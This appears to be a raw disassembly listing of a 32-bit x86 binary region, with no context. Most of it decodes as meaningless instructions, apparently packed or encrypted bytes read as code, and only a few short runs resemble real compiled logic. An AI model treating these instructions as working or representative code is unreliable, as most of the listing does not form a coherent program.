  40ae99:	lock imul eax,edi,0x4510a116
  40aea0:	sbb    BYTE PTR [eax+0x50],0x9
  40aea4:	fcmovne st,st(4)
  40aea6:	xor    edi,DWORD PTR [ecx-0x65]
  40aea9:	inc    esi
  40aeaa:	mov    ecx,0x7418bde6
  40aeaf:	enter  0x32e8,0x22
  40aeb3:	jge    0x40ae5a
  40aeb5:	mov    bl,0xc8
  40aeb7:	outs   dx,DWORD PTR ds:[esi]
  40aeb8:	push   cs
  40aeb9:	fdiv   DWORD PTR [esi+esi*4+0x4c854263]
  40aec0:	gs inc edx
  40aec2:	mov    ch,0xd4
  40aec4:	xchg   esi,eax
  40aec5:	adc    edi,DWORD PTR [ecx-0x12]
  40aec8:	fs ja  0x40ae5f
  40aecb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aecc:	add    eax,ebp
  40aece:	ja     0x40ae5a
  40aed0:	pop    ds
  40aed1:	cmp    ebx,eax
  40aed3:	pop    ds
  40aed4:	sub    al,0x9b
  40aed6:	xor    BYTE PTR [ebx],ch
  40aed8:	sbb    al,ch
  40aeda:	out    dx,al
  40aedb:	pop    ds
  40aedc:	or     edx,edi
  40aede:	daa    
  40aedf:	jmp    0x40aee6
  40aee1:	(bad)  
  40aee2:	ror    BYTE PTR [edi+0x6ce6005c],cl
  40aee8:	lods   eax,DWORD PTR ds:[esi]
  40aee9:	adc    ebp,ecx
  40aeeb:	stos   BYTE PTR es:[edi],al
  40aeec:	repz inc esp
  40aeee:	or     ebx,DWORD PTR [eax]
  40aef0:	cmp    eax,0xce83b03e
  40aef5:	aam    0xd3
  40aef7:	ja     0x40aeb3
  40aef9:	add    eax,0x473a68e3
  40aefe:	pop    ds
  40aeff:	enter  0xb11c,0x26
  40af03:	xchg   ebp,eax
  40af04:	imul   esp,DWORD PTR [edi],0xba6586b8
  40af0a:	js     0x40af47
  40af0c:	xchg   BYTE PTR [ebx+0x6eacf942],bl
  40af12:	sbb    al,ch
  40af14:	mov    edx,0x2d87fd7d
  40af19:	dec    eax
  40af1a:	or     esi,DWORD PTR [ecx+eax*8+0x2ce1f5d7]
  40af21:	je     0x40aed7
  40af23:	fs jmp 0xa5eb49c6
  40af29:	gs in  eax,dx
  40af2b:	add    al,0xf1
  40af2d:	into   
  40af2e:	mov    ebp,0x6e4ffb5c
  40af33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af34:	in     al,dx
  40af35:	mov    DWORD PTR [eax],ebx
  40af37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af38:	retf   
  40af39:	push   0x6dd4fd95
  40af3e:	add    esi,ecx
  40af40:	ret    
  40af41:	inc    eax
  40af42:	jo     0x40af50
  40af44:	mov    ebp,0x546f728f
  40af49:	push   edi
  40af4a:	jle    0x40af4a
  40af4c:	(bad)  
  40af4d:	cmp    al,0x91
  40af4f:	fcom   DWORD PTR [ebx+0x67b62147]
  40af55:	sub    ebx,DWORD PTR [ebx-0x38]
  40af58:	cmp    bh,BYTE PTR [eax-0x5fe05ad2]
  40af5e:	adc    dl,BYTE PTR [edx-0x49a70fe7]
  40af64:	call   0x1dfd:0xba569ed9
  40af6b:	xchg   ebp,eax
  40af6c:	push   ss
  40af6d:	jb     0x40afa5
  40af6f:	(bad)  
  40af70:	jne    0x40af1c
  40af72:	mov    dl,0x1a
  40af74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40af75:	xchg   ebx,eax
  40af76:	(bad)  
  40af77:	neg    BYTE PTR [esi+0x57aad38a]
  40af7d:	outs   dx,BYTE PTR ds:[esi]
  40af7e:	aad    0xa5
  40af80:	shl    BYTE PTR [esi],cl
  40af82:	pop    ecx
  40af83:	and    eax,0xe73c4e58
  40af88:	jmp    0x40afce
  40af8a:	sub    edi,DWORD PTR [ebx-0x66]
  40af8d:	repnz inc esi
  40af8f:	mov    al,ds:0x394c214d
  40af94:	inc    edi
  40af95:	neg    BYTE PTR [ebx+esi*4-0x3b]
  40af99:	test   BYTE PTR [ecx],0xa6
  40af9c:	and    eax,0x7a06e89c
  40afa1:	pushf  
  40afa2:	xor    bh,al
  40afa4:	inc    ebp
  40afa5:	cmp    dh,BYTE PTR [esi+0x16]
  40afa8:	jmp    0x40afa5
  40afaa:	and    eax,0xd5c5176e
  40afaf:	nop
  40afb0:	cmp    BYTE PTR [esi-0x49],0x4
  40afb4:	aaa    
  40afb5:	std    
  40afb6:	lods   eax,DWORD PTR ds:[esi]
  40afb7:	pop    esi
  40afb8:	or     ebx,esp
  40afba:	jb     0x40b005
  40afbc:	xchg   si,ax
  40afbe:	adc    bh,0xc
  40afc1:	out    dx,al
  40afc2:	push   0x5a
  40afc4:	cld    
  40afc5:	js     0x40b046
  40afc7:	(bad)  
  40afc8:	imul   ecx,DWORD PTR [ebp+edx*1-0x76f0c143],0x5d
  40afd0:	hlt    
  40afd1:	mov    eax,DWORD PTR [eax]
  40afd3:	mov    cx,WORD PTR [ebp-0x4]
  40afd7:	movzx  ecx,cx
  40afda:	add    ecx,DWORD PTR [eax]
  40afdc:	mov    DWORD PTR [ebp-0x14],0xf89c853d
  40afe3:	mov    DWORD PTR [ebp-0x1c],ecx
  40afe6:	jmp    0x40b333
  40afeb:	js     0x40b055
  40afed:	adc    ebp,ebx
  40afef:	jae    0x40b062
  40aff1:	loopne 0x40b05c
  40aff3:	lfs    esi,FWORD PTR [edx]
  40aff6:	or     dh,ch
  40aff8:	pusha  
  40aff9:	add    eax,0x7ee879e2
  40affe:	jle    0x40b02e
  40b000:	jge    0x40b080
  40b002:	jle    0x40afbd
  40b004:	pop    ss
  40b005:	inc    edi
  40b006:	push   edi
  40b007:	sbb    bh,BYTE PTR [edi+edi*2+0x47]
  40b00b:	imul   edi,eax,0xffffffc9
  40b00e:	mov    ch,BYTE PTR [ecx]
  40b010:	js     0x40b06f
  40b012:	add    DWORD PTR [edi+0x3bad1ce8],ebx
  40b018:	sub    al,0x1c
  40b01a:	dec    ecx
  40b01b:	or     dh,BYTE PTR [ecx]
  40b01d:	and    DWORD PTR [edi-0x78],edx
  40b020:	inc    esp
  40b021:	cs jne 0x40b038
  40b024:	or     ah,BYTE PTR [edx-0x1d2ac0c1]
  40b02a:	push   0x91646135
  40b02f:	add    esp,DWORD PTR [edi]
  40b031:	dec    esp
  40b032:	push   0x119db80a
  40b037:	adc    BYTE PTR [ecx],0x8e
  40b03a:	or     DWORD PTR [ebp-0x28c76a4c],eax
  40b040:	std    
  40b041:	sti    
  40b042:	mov    al,ds:0xf53a483f
  40b047:	adc    BYTE PTR [edi+0x65f0e6ae],0x29
  40b04e:	inc    esp
  40b04f:	hlt    
  40b050:	stos   DWORD PTR es:[edi],eax
  40b051:	fwait
  40b052:	dec    ebx
  40b053:	dec    ebx
  40b054:	not    DWORD PTR [esi]
  40b056:	lea    eax,ds:0x5912f02d
  40b05c:	retf   
  40b05d:	or     DWORD PTR [ecx-0xe],edx
  40b060:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b061:	mov    DWORD PTR [ecx],esi
  40b063:	cmp    eax,0x47759c9c
  40b068:	mov    ebx,0xc13708bc
  40b06d:	popf   
  40b06e:	mov    edx,0xaf93fbe3
  40b073:	push   ss
  40b074:	in     al,0xe8
  40b076:	push   0x48
  40b078:	sub    BYTE PTR [ebp+eax*2-0x45],al
  40b07c:	in     al,0xdf
  40b07e:	addr16 cdq 
  40b080:	push   edi
  40b081:	outs   dx,BYTE PTR ds:[esi]
  40b082:	sbb    al,0x58
  40b084:	adc    al,0xd9
  40b086:	mov    bl,0x62
  40b088:	stos   DWORD PTR es:[edi],eax
  40b089:	mov    DWORD PTR [edi-0x44136413],eax
  40b08f:	jne    0x40b08d
  40b091:	lock mov bh,0x7c
  40b094:	mov    bl,BYTE PTR [eax]
  40b096:	cmp    al,0x8f
  40b098:	popa   
  40b099:	pop    esi
  40b09a:	ficomp DWORD PTR [ebp-0x1f]
  40b09d:	loopne 0x40b0da
  40b09f:	loope  0x40b02d
  40b0a1:	fimul  WORD PTR [eax+edx*4+0x5]
  40b0a5:	imul   edx,DWORD PTR ds:0x61c61209,0xffffffe0
  40b0ac:	xlat   BYTE PTR es:[ebx]
  40b0ae:	sub    DWORD PTR [esi+ebp*8+0x7e],esp
  40b0b2:	std    
  40b0b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b0b4:	jle    0x40b0c1
  40b0b6:	test   BYTE PTR [ebx],0x69
  40b0b9:	xchg   ebp,eax
  40b0ba:	je     0x40b06c
  40b0bc:	js     0x40b131
  40b0be:	in     al,0xa4
  40b0c0:	imul   eax,esi,0x82f0db98
  40b0c6:	leave  
  40b0c7:	inc    esp
  40b0c8:	xor    BYTE PTR [edx-0x68805ee5],ch
  40b0ce:	lods   al,BYTE PTR ds:[esi]
  40b0cf:	inc    ecx
  40b0d0:	jno    0x40b10a
  40b0d2:	adc    eax,0x61f7d470
  40b0d7:	ret    0x6984
  40b0da:	or     ebp,eax
  40b0dc:	fwait
  40b0dd:	jb     0x40b128
  40b0df:	stos   DWORD PTR es:[edi],eax
  40b0e0:	add    BYTE PTR [edi],dh
  40b0e2:	loope  0x40b0e3
  40b0e4:	xchg   DWORD PTR [esi+ebp*4-0x77],esp
  40b0e8:	pop    ecx
  40b0e9:	pop    es
  40b0ea:	std    
  40b0eb:	and    cl,dl
  40b0ed:	mov    dl,0xea
  40b0ef:	daa    
  40b0f0:	mov    edx,0x568091ea
  40b0f5:	mov    ecx,0xa4641693
  40b0fa:	sub    ebp,esp
  40b0fc:	outs   dx,BYTE PTR ds:[esi]
  40b0fd:	lods   eax,DWORD PTR ds:[esi]
  40b0fe:	call   0xbd556ae5
  40b103:	cld    
  40b104:	rcr    DWORD PTR [ebp+0x2f6f8a58],0x2b
  40b10b:	addr16 push ss
  40b10d:	adc    al,BYTE PTR [esi+eiz*4+0x73]
  40b111:	dec    edi
  40b112:	jmp    0x684f:0xd7eee514
  40b119:	cs or  eax,0x339d404d
  40b11f:	test   DWORD PTR [edx+0x49],0xd1d5a9f1
  40b126:	fnstenv [edi+0x1a0e0555]
  40b12c:	jp     0x40b145
  40b12e:	jae    0x40b0c7
  40b130:	jl     0x40b167
  40b132:	nop
  40b133:	iret   
  40b134:	inc    ecx
  40b135:	fs pop es
  40b137:	call   0xb5a3440e
  40b13c:	es mov bh,bh
  40b13f:	mov    bh,0x9f
  40b141:	or     ah,ah
  40b143:	addr16 xor ecx,0xf8ad2f3a
  40b14a:	xchg   ebx,eax
  40b14b:	xor    DWORD PTR [esi],ebx
  40b14d:	dec    esp
  40b14e:	and    edi,edx
  40b150:	and    ebp,DWORD PTR [edi-0x22]
  40b153:	(bad)  
  40b155:	loope  0x40b1be
  40b157:	add    eax,0xe8c2acc7
  40b15c:	inc    eax
  40b15d:	pusha  
  40b15e:	ret    0x6ff8
  40b161:	es xor edi,ecx
  40b164:	popf   
  40b165:	pop    ds
  40b166:	std    
  40b167:	mov    dh,BYTE PTR [eax]
  40b169:	mov    eax,ds:0x57579f8d
  40b16e:	mov    ah,0xcd
  40b170:	jns    0x40b1ed
  40b172:	nop
  40b173:	nop
  40b174:	test   dh,dh
  40b176:	leave  
  40b177:	je     0x40b159
  40b179:	in     eax,dx
  40b17a:	sbb    BYTE PTR [edx],al
  40b17c:	out    0x9e,al
  40b17e:	int3   
  40b17f:	jp     0x40b189
  40b181:	sbb    al,0xe
  40b183:	xchg   edi,eax
  40b184:	(bad)  
  40b185:	jne    0x40b126
  40b187:	and    eax,ebp
  40b189:	test   al,0x42
  40b18b:	add    ah,BYTE PTR [ecx-0x72713663]
  40b191:	jno    0x40b173
  40b193:	cmp    DWORD PTR ds:0xfe4b78f1,edx
  40b199:	push   0xc1187db4
  40b19e:	loopne 0x40b19c
  40b1a0:	mov    BYTE PTR [ebx+0x31],cl
  40b1a3:	mov    al,dl
  40b1a5:	xor    al,BYTE PTR [esi+ebx*2-0x67db58bd]
  40b1ac:	int3   
  40b1ad:	(bad)  
  40b1ae:	jbe    0x40b202
  40b1b0:	sbb    bl,BYTE PTR [esi-0x4a]
  40b1b3:	pushf  
  40b1b4:	cmp    al,0x5f
  40b1b6:	fisttp WORD PTR [edx+0x341b5eab]
  40b1bc:	(bad)  
  40b1bd:	jmp    0xacee47f1
  40b1c2:	mov    dl,0x2f
  40b1c4:	adc    DWORD PTR ds:0x6cb692ca,edi
  40b1ca:	adc    ecx,DWORD PTR [edx+0x682a80f6]
  40b1d0:	push   esi
  40b1d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b1d2:	shl    ah,1
  40b1d4:	lds    edi,FWORD PTR [eax+ebp*8-0x5e5463f5]
  40b1db:	movd   DWORD PTR [ebx*4-0x4f14ff46],mm5
  40b1e3:	daa    
  40b1e4:	mov    ebx,0x807d24aa
  40b1e9:	inc    ebx
  40b1ea:	push   0x3f
  40b1ec:	enter  0xd696,0x3a
  40b1f0:	mov    ch,0xa3
  40b1f2:	sub    esi,DWORD PTR [ecx+0x473aef67]
  40b1f8:	lock imul esi,DWORD PTR [edx],0xffffffba
  40b1fc:	es or  al,0x18
  40b1ff:	adc    BYTE PTR [esp+esi*8],bl
  40b202:	and    eax,DWORD PTR [ecx+ebp*8]
  40b205:	das    
  40b206:	or     BYTE PTR [ecx+0x11c25345],ch
  40b20c:	jmp    0x40b1ba
  40b20e:	mov    bh,0xd0
  40b210:	aaa    
  40b211:	and    eax,0xc6f90a3
  40b216:	call   0xbb439930
  40b21b:	or     edx,0xcff6c489
  40b221:	push   ds
  40b222:	cmp    eax,0x3dc85200
  40b227:	lock jmp 0xc130:0xb0a0a23d
  40b22f:	mov    ebx,0xd421aec8
  40b234:	push   ss
  40b235:	and    ch,BYTE PTR [ecx-0x50ca7d40]
  40b23b:	jle    0x40b1f2
  40b23d:	sahf   
  40b23e:	sti    
  40b23f:	addr16 loopne 0x40b2b2
  40b242:	dec    edx
  40b243:	js     0x40b26e
  40b245:	popf   
  40b246:	jo     0x40b1d0
  40b248:	jmp    0xea351cc4
  40b24d:	jbe    0x40b23e
  40b24f:	xchg   DWORD PTR [edx-0x2],edi
  40b252:	add    DWORD PTR [ecx-0x32],edx
  40b255:	sub    al,0x0
  40b257:	fdiv   st,st(4)
  40b259:	mov    esi,0xc833ea9
  40b25e:	(bad)  
  40b25f:	gs jge 0x40b2a4
  40b262:	add    bh,BYTE PTR [eax+0x6a]
  40b265:	xchg   DWORD PTR [edx-0x77bc8720],eax
  40b26b:	dec    eax
  40b26c:	sub    DWORD PTR [esi+eax*2-0x1],esi
  40b270:	push   ebp
  40b271:	mov    ecx,0xd6bd3aaf
  40b276:	jae    0x40b2a1
  40b278:	dec    edx
  40b279:	inc    esp
  40b27a:	xlat   BYTE PTR ds:[ebx]
  40b27b:	lods   al,BYTE PTR ds:[esi]
  40b27c:	dec    ecx
  40b27d:	fcomp  QWORD PTR [ecx-0x21]
  40b280:	mov    ebx,0x2ad77397
  40b285:	dec    ebx
  40b286:	cld    
  40b287:	imul   ecx,ebx,0xff8edc44
  40b28d:	inc    esp
  40b28e:	xchg   ebp,eax
  40b28f:	sub    al,0x9
  40b291:	push   ds
  40b292:	ja     0x40b2c6
  40b294:	cwde   
  40b295:	or     al,0xa4
  40b298:	cs cdq 
  40b29a:	mov    DWORD PTR [edi-0x4c],eax
  40b29d:	xlat   BYTE PTR ds:[ebx]
  40b29e:	test   eax,0x57cebd39
  40b2a3:	xchg   esp,eax
  40b2a4:	jne    0x40b2d8
  40b2a6:	xchg   ecx,eax
  40b2a7:	mov    WORD PTR [ebx+ebp*1],ss
  40b2aa:	push   ds
  40b2ab:	dec    ebp
  40b2ac:	push   ss
  40b2ad:	sbb    al,0x40
  40b2af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b2b0:	xchg   ecx,eax
  40b2b1:	inc    esp
  40b2b2:	mov    BYTE PTR ds:0x4070e536,cl
  40b2b8:	or     DWORD PTR [edx],esp
  40b2ba:	stos   DWORD PTR es:[edi],eax
  40b2bb:	push   esp
  40b2bc:	mov    DWORD PTR [edi],ebx
  40b2be:	test   BYTE PTR [esi+ebx*4],0x26
  40b2c2:	push   0x484a1915
  40b2c7:	test   DWORD PTR [ecx+0x1b],0xba993878
  40b2ce:	sub    edi,DWORD PTR [ebp-0x2119dc63]
  40b2d4:	and    BYTE PTR [esi-0x1],dl
  40b2d7:	mov    cl,0xca
  40b2d9:	stc    
  40b2da:	add    DWORD PTR [edx+0x55],edx
  40b2dd:	dec    BYTE PTR [eax+esi*4+0x7b0a49b7]
  40b2e4:	or     edx,edi
  40b2e6:	xor    eax,esp
  40b2e8:	inc    eax
  40b2e9:	dec    ecx
  40b2ea:	mov    DWORD PTR [ebx-0x67],esp
  40b2ed:	sbb    BYTE PTR ds:0x15dcf51b,dl
  40b2f3:	iret   
  40b2f4:	int    0xc4
  40b2f6:	cld    
  40b2f7:	dec    eax
  40b2f8:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  40b2fa:	sti    
  40b2fb:	repz xchg ebx,eax
  40b2fd:	mov    ebp,0xa3d4016f
  40b302:	mov    ebx,0x418d2e10
  40b307:	mov    ecx,0x10c5500b
  40b30c:	je     0x40b2b9
  40b30e:	pop    ss
  40b30f:	xchg   edi,eax
  40b310:	arpl   WORD PTR [ebx],cx
  40b312:	ins    BYTE PTR es:[edi],dx
  40b313:	and    bh,dl
  40b315:	std    
  40b316:	push   0x304d1497
  40b31b:	cmc    
  40b31c:	fs push eax
  40b31e:	aaa    
  40b31f:	jbe    0x40b33d
  40b321:	outs   dx,DWORD PTR ds:[esi]
  40b322:	and    eax,0xa552b3f5
  40b327:	xor    ch,dl
  40b329:	lods   al,BYTE PTR ds:[esi]
  40b32a:	xor    cl,ah
  40b32c:	mov    eax,ds:0x45df5a7a
  40b331:	les    ebp,FWORD PTR [ebx-0x75]
  40b334:	inc    ebp
  40b335:	or     BYTE PTR [ebx-0x39cc07b3],cl
  40b33b:	add    eax,edi
  40b33d:	cmp    DWORD PTR [ecx],eax
  40b33f:	jne    0x40c44a
  40b345:	mov    eax,DWORD PTR [ebp+0x8]
  40b348:	mov    ecx,DWORD PTR [ebp-0x1c]
  40b34b:	xor    eax,esi
  40b34d:	add    eax,edi
  40b34f:	cmp    DWORD PTR [ecx],eax
  40b351:	jne    0x40b6c1
  40b357:	mov    eax,DWORD PTR [ebp+0x8]
  40b35a:	mov    ecx,DWORD PTR [ebp-0x10]
  40b35d:	xor    eax,esi
  40b35f:	add    eax,edi
  40b361:	mov    DWORD PTR [ecx],eax
  40b363:	jmp    0x40b6b0
  40b368:	cmp    eax,0xe9fdcd2a
  40b36d:	pop    ecx
  40b36e:	dec    ebp
  40b36f:	push   0x46
  40b371:	aam    0xcc
  40b373:	int3   
  40b374:	pusha  
  40b375:	jl     0x40b364
  40b377:	xchg   BYTE PTR [ecx],ch
  40b379:	idiv   DWORD PTR [esi+0x7e]
  40b37c:	cs jge 0x40b3fd
  40b37f:	jle    0x40b337
  40b381:	jnp    0x40b39f
  40b383:	xor    ah,ch
  40b385:	xor    al,0x4f
  40b387:	adc    al,0x18
  40b389:	cmp    dh,dl
  40b38b:	(bad)  
  40b38c:	ficomp DWORD PTR ds:0x4bfacb8b
  40b392:	fsub   DWORD PTR [ebx]
  40b394:	xchg   ecx,edi
  40b396:	ins    BYTE PTR es:[edi],dx
  40b397:	dec    esi
  40b398:	jnp    0x40b375
  40b39a:	mov    cl,0x9a
  40b39c:	jl     0x40b37a
  40b39e:	outs   dx,DWORD PTR ds:[esi]
  40b39f:	js     0x40b35b
  40b3a1:	popa   
  40b3a2:	push   edx
  40b3a3:	rcr    DWORD PTR [edi-0x798869bb],cl
  40b3a9:	cmp    BYTE PTR [edx],ch
  40b3ab:	sbb    DWORD PTR [ecx+0x49],ebp
  40b3ae:	and    dl,BYTE PTR [ebx*2+0x3363f621]
  40b3b5:	mov    ah,bh
  40b3b7:	jo     0x40b3dd
  40b3b9:	push   es
  40b3ba:	sub    bl,BYTE PTR [esi+0x4b]
  40b3bd:	shl    DWORD PTR [edi],0xc
  40b3c0:	mov    eax,0x83152098
  40b3c5:	cmp    al,0xa5
  40b3c7:	imul   ecx,DWORD PTR gs:[ecx],0x53f03e18
  40b3ce:	xlat   BYTE PTR ds:[ebx]
  40b3cf:	sub    DWORD PTR [edi+0x2c6136ad],0xc
  40b3d6:	sub    ah,BYTE PTR [ebp+0x2012ffa1]
  40b3dc:	mov    esp,0xc4b6238c
  40b3e1:	int    0xb8
  40b3e3:	mov    edx,0x909ba588
  40b3e8:	into   
  40b3e9:	mov    ?,WORD PTR [edi]
  40b3eb:	xor    eax,0xd323aabb
  40b3f0:	test   eax,0xa77336ef
  40b3f5:	and    eax,0xd2348e65
  40b3fa:	fcom   QWORD PTR [di]
  40b3fd:	neg    BYTE PTR [ebx+0x2d]
  40b400:	shl    esp,1
  40b402:	mov    ds:0xed0b71bc,eax
  40b407:	pop    ds
  40b408:	daa    
  40b409:	dec    ecx
  40b40a:	arpl   bx,cx
  40b40c:	xchg   ebx,eax
  40b40d:	sahf   
  40b40e:	fsub   st(7),st
  40b410:	daa    
  40b411:	adc    BYTE PTR [esi-0x39a05e35],0x44
  40b418:	(bad)  
  40b419:	das    
  40b41a:	(bad)  
  40b41b:	int3   
  40b41c:	push   esp
  40b41d:	jno    0x40b471
  40b41f:	and    DWORD PTR [eax-0x2a],ebp
  40b422:	(bad)  
  40b423:	aad    0x95
  40b425:	or     BYTE PTR [eax+0x769fbbf0],bl
  40b42b:	add    eax,0x402d951c
  40b430:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b431:	and    ah,bh
  40b433:	test   DWORD PTR [edx+0x1d],ecx
  40b436:	or     esi,ebx
  40b438:	mov    cl,0x3b
  40b43a:	adc    BYTE PTR [eax+0x6746af6f],bh
  40b440:	xlat   BYTE PTR ds:[ebx]
  40b441:	mov    ?,WORD PTR [edx-0xa6d7931]
  40b447:	cmc    
  40b448:	dec    esi
  40b449:	pop    es
  40b44a:	rcl    edx,1
  40b44c:	mov    dl,0xd5
  40b44e:	adc    ah,ah
  40b450:	add    eax,0xb73a4f84
  40b455:	sub    bh,cl
  40b457:	pop    ebp
  40b458:	call   0x405e59f2
  40b45d:	jno    0x40b3fb
  40b45f:	inc    esp
  40b460:	call   0x93f08d30
  40b465:	jnp    0x40b4a0
  40b467:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b468:	nop
  40b469:	scas   eax,DWORD PTR es:[edi]
  40b46a:	inc    ebx
  40b46b:	adc    eax,0xc1790ebe
  40b470:	pop    esi
  40b471:	adc    eax,0x4b7a0b45
  40b476:	stos   DWORD PTR es:[edi],eax
  40b477:	adc    al,0xb4
  40b479:	xor    al,0x77
  40b47b:	lods   eax,DWORD PTR ds:[esi]
  40b47c:	cmp    ebx,ebx
  40b47e:	jl     0x40b410
  40b480:	(bad)  
  40b481:	fbld   TBYTE PTR [edx+ecx*1]
  40b484:	push   ebx
  40b485:	adc    al,0x3a
  40b487:	pop    esi
  40b488:	inc    esi
  40b489:	(bad)  
  40b48a:	hlt    
  40b48b:	mov    BYTE PTR [edx-0x7b7784d3],ah
  40b491:	push   cs
  40b492:	mov    edi,0x344dd3a5
  40b497:	and    BYTE PTR [eax],dh
  40b499:	(bad)  
  40b49a:	and    al,al
  40b49c:	push   ss
  40b49d:	cmp    bh,BYTE PTR [edi+eiz*1+0x2d]
  40b4a1:	mov    bl,0xc7
  40b4a3:	gs test al,0xad
  40b4a6:	stos   DWORD PTR es:[edi],eax
  40b4a7:	arpl   cx,bp
  40b4a9:	or     esp,DWORD PTR [edi+edi*4+0x772fd396]
  40b4b0:	fcmovne st,st(6)
  40b4b2:	hlt    
  40b4b3:	cwde   
  40b4b4:	cmc    
  40b4b5:	lods   al,BYTE PTR ds:[esi]
  40b4b6:	(bad)  
  40b4b7:	out    dx,al
  40b4b8:	sub    eax,0xa9a72d85
  40b4bd:	xchg   ebp,eax
  40b4be:	mov    ch,0x10
  40b4c0:	int3   
  40b4c1:	push   esp
  40b4c2:	fs mov bl,0xa4
  40b4c5:	mov    bl,BYTE PTR [ebp+0x66c8bb3a]
  40b4cb:	or     ecx,DWORD PTR [ebp-0x18]
  40b4ce:	fimul  DWORD PTR [ebp+0xc]
  40b4d1:	icebp  
  40b4d2:	xor    ebx,DWORD PTR [eax+ebx*1]
  40b4d5:	mov    ecx,0x84a3652a
  40b4da:	sahf   
  40b4db:	std    
  40b4dc:	push   0xf
  40b4de:	imul   ebp,ebp,0xfffffff7
  40b4e1:	loope  0x40b464
  40b4e3:	lods   eax,DWORD PTR ds:[esi]
  40b4e4:	sub    BYTE PTR [eax-0x4e],cl
  40b4e7:	jmp    0x40b53a
  40b4e9:	lock daa 
  40b4eb:	mov    ds:0xd62bc7ac,eax
  40b4f0:	adc    bh,bl
  40b4f2:	fwait
  40b4f3:	(bad)  
  40b4f4:	and    eax,0x6e79edd2
  40b4f9:	pop    ebx
  40b4fa:	stos   BYTE PTR es:[edi],al
  40b4fb:	outs   dx,DWORD PTR ds:[esi]
  40b4fc:	or     edi,DWORD PTR [eax]
  40b4fe:	xchg   ebp,eax
  40b4ff:	ins    BYTE PTR es:[edi],dx
  40b500:	mov    edi,0xe0b75301
  40b505:	outs   dx,BYTE PTR ds:[esi]
  40b506:	pop    ss
  40b507:	stos   DWORD PTR es:[edi],eax
  40b508:	and    DWORD PTR [eax],ecx
  40b50a:	mov    dl,0x9e
  40b50c:	pop    ebp
  40b50d:	sbb    ecx,DWORD PTR [eax+0x662da66d]
  40b513:	cmp    al,0xed
  40b515:	mov    WORD PTR [ebx-0x77],?
  40b518:	ins    BYTE PTR es:[edi],dx
  40b519:	loop   0x40b580
  40b51b:	pop    edx
  40b51c:	mov    ah,0x42
  40b51e:	mov    ecx,0xf47991ee
  40b523:	into   
  40b524:	sahf   
  40b525:	ds jmp 0x7b71:0xc8bb44b8
  40b52d:	idiv   BYTE PTR [ecx+0x23d6a9e]
  40b533:	shl    DWORD PTR [edi],1
  40b535:	push   ebp
  40b536:	or     bl,BYTE PTR [ebp+eiz*1-0x63]
  40b53a:	ss ins DWORD PTR es:[di],dx
  40b53d:	jne    0x40b529
  40b53f:	imul   edx,DWORD PTR [ebx-0x5],0x9bb1ff78
  40b546:	repnz mov edx,0x57178448
  40b54c:	les    edi,FWORD PTR [edi-0x13966f9c]
  40b552:	stos   BYTE PTR es:[edi],al
  40b553:	das    
  40b554:	js     0x40b4f8
  40b556:	imul   eax,DWORD PTR [esi-0x3b],0xcd026dc5
  40b55d:	cmp    eax,ebx
  40b55f:	mov    esp,0x43333f43
  40b564:	arpl   WORD PTR [edi+esi*2+0x2ed49377],bp
  40b56b:	add    al,0x6a
  40b56d:	inc    esp
  40b56e:	(bad)  
  40b56f:	mov    dl,0xe9
  40b571:	xlat   BYTE PTR ds:[ebx]
  40b572:	nop
  40b573:	sahf   
  40b574:	adc    al,0x39
  40b576:	sub    BYTE PTR [ecx],0xa1
  40b579:	cwde   
  40b57a:	cmp    BYTE PTR [ebx+0x298e521f],bl
  40b580:	cmp    esp,edx
  40b582:	xchg   esp,eax
  40b583:	mov    gs,WORD PTR ds:[ecx]
  40b586:	imul   edx,DWORD PTR [eax+ebx*2+0x2475f45],0x5959ed4a
  40b591:	xor    edi,esp
  40b593:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b594:	into   
  40b595:	push   es
  40b596:	cwde   
  40b597:	mov    eax,ds:0x70a8ef47
  40b59c:	inc    eax
  40b59d:	les    eax,FWORD PTR [ecx]
  40b59f:	and    edi,DWORD PTR [eax+0x56445b86]
  40b5a5:	fxch   st(3)
  40b5a7:	in     eax,0xcd
  40b5a9:	mov    al,ds:0x91fa943f
  40b5ae:	xchg   ebp,eax
  40b5af:	test   BYTE PTR [edx+0x7c5cb706],dl
  40b5b5:	xor    edi,DWORD PTR [edx-0x2a]
  40b5b8:	int3   
  40b5b9:	sar    DWORD PTR [ebp+0x3f645977],1
  40b5bf:	push   ebx
  40b5c0:	adc    al,0xea
  40b5c2:	repnz ins BYTE PTR es:[edi],dx
  40b5c4:	or     DWORD PTR [edi+0x7c],edi
  40b5c7:	sahf   
  40b5c8:	or     eax,0x2a6cbf45
  40b5cd:	jne    0x40b637
  40b5cf:	push   ebp
  40b5d0:	adc    DWORD PTR [ecx-0x17],ebp
  40b5d3:	repnz pop ebp
  40b5d5:	stos   BYTE PTR es:[edi],al
  40b5d6:	popf   
  40b5d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b5d8:	pop    ss
  40b5d9:	push   eax
  40b5da:	shl    DWORD PTR [ebx],1
  40b5dc:	xchg   ecx,eax
  40b5dd:	mov    ch,0xf8
  40b5df:	dec    edi
  40b5e0:	fidiv  DWORD PTR [ebx]
  40b5e2:	repnz mov DWORD PTR [edx-0x42575904],edx
  40b5e9:	outs   dx,DWORD PTR ds:[esi]
  40b5ea:	hlt    
  40b5eb:	push   ds
  40b5ec:	adc    DWORD PTR [edi-0x68],edx
  40b5ef:	out    0x27,al
  40b5f1:	jg     0x40b5e9
  40b5f3:	inc    ebx
  40b5f4:	scas   al,BYTE PTR es:[edi]
  40b5f5:	shl    BYTE PTR [ebx-0x65],cl
  40b5f8:	int    0x75
  40b5fa:	int3   
  40b5fb:	(bad)  [ecx-0xf1b1215]
  40b601:	pop    ss
  40b602:	mov    eax,ds:0xdd6f9090
  40b607:	sti    
  40b608:	sub    cl,dl
  40b60a:	ss loope 0x40b689
  40b60d:	call   0x5b37aa52
  40b612:	sbb    DWORD PTR [eax-0x2a989d83],ebp
